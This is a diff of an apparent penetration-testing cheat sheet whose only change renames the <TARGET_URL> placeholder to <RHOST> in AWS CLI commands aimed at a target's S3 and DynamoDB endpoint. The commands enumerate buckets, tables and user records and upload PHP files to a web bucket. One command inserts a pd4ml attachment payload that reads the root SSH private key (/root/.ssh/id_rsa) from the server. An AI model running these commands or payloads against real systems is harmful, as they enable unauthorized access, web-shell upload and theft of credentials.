@@ -23,43 +23,43 @@ Default output format [None]: json
 ### List Buckets
 
 ```c
-$ aws --endpoint-url=http://s3.<TARGET_URL> s3api list-buckets
+$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
 ```
 
 ### List Tables
 
 ```c
-$ aws dynamodb list-tables --endpoint-url http://s3.<TARGET_URL>/
+$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
 ```
 
 ### List Users
 
 ```c
-$ aws dynamodb scan --table-name users --endpoint-url http://s3.<TARGET_URL>/
+$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
 ```
 
 ### Upload Files
 
 ```c
-$ aws s3api put-object --endpoint-url http://s3.<TARGET_URL>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
+$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
 ```
 
 ### Alternativ Upload Technique
 
 ```c
-$ aws --endpoint-url=http://s3.<TARGET_URL> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
+$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
 ```
 
 ### Create Table
 
 ```c
-$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<TARGET_URL>
+$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
 ```
 
 ### Extract Data into Table
 
 ```c
-$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<TARGET_URL>
+$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
 ```
 
 ### List Keys
